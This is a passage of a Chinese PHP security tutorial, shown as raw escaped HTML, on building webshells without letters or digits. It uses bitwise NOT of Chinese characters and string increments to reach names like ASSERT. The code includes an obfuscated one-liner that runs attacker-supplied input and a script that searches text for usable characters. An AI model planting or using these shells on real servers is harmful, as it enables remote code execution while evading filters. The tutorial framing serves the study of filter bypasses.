&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;瞰&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;});&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;和&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;});&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;和&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;});&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;的&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;});&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;半&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;});&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;始&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;俯&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;});&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;瞰&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;});&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;次&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;});&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;站&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=~&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;{&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$$_____&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;[&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;寻找思路:找一篇长点的文章,写个脚本把里面的字挨个试一下,看通过截取并取反这个过程能不能得到字母&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;error_reporting(&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;header(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;Content-Type: text/html; charset=utf-8&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;str_split_unicode&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$l&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$l&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ret&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$len&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; mb_strlen(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$len&lt;/span&gt;; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$l&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ret&lt;/span&gt;[] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; mb_substr(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$l&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ret&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; preg_split(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;//u&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt;, &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;, PREG_SPLIT_NO_EMPTY);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$s&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$arr_str&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_split_unicode(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$s&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt; strlen(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$s&lt;/span&gt;) ; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$arr_str&lt;/span&gt;[&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;--&amp;gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.~&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$arr_str&lt;/span&gt;[&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt;]{&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;}&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;递增递减&#34;&gt;递增／递减&lt;/h2&gt;
&lt;p&gt;PHP 支持 C 风格的前／后递增与递减运算符。&lt;/p&gt;
&lt;p&gt;所以，我们只要能拿到一个变量，其值为&lt;code&gt;a&lt;/code&gt;，通过自增操作即可获得a-z中所有字符。&lt;/p&gt;
&lt;p&gt;数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。&lt;/p&gt;
&lt;p&gt;如果强制连接数组和字符串的话，数组将被转换成字符串，其值为&lt;code&gt;Array&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/617a34752ab3f51d91b97c7a.jpg#alt=&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/617a34752ab3f51d91b97c7a.jpg#alt=&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;[];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=@&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;$_&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// $_=&amp;#39;Array&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;!&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;@&amp;#39;&lt;/span&gt;]; &lt;span style=&#34;color:#6272a4&#34;&gt;// $_=$_[0];
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// A
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// S
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// S
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;;
